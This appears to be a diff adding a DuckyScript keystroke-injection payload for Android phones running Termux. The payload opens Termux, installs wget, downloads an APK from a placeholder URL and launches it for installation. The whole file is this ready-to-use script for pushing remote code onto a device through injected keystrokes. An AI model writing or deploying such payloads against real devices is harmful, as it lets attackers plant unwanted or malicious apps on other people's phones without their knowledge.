@@ -1,0 +1,23 @@
+REM =====================================================
+REM Title: Install APK from URL
+REM Author: yogeshjoga
+REM Target: Android 8.0+ with Termux
+REM Category: URL-Based Application Installation
+REM Description: Downloads and installs APK from URL
+REM IMPORTANT: Replace YOUR_APK_URL with actual APK URL
+REM NOTE: Requires Termux and appropriate permissions
+REM =====================================================
+
+DELAY 2000
+STRING termux
+DELAY 1000
+ENTER
+DELAY 2000
+STRING pkg install wget -y
+ENTER
+DELAY 3000
+STRING wget YOUR_APK_URL -O app.apk
+ENTER
+DELAY 5000
+STRING termux-open app.apk
+ENTER
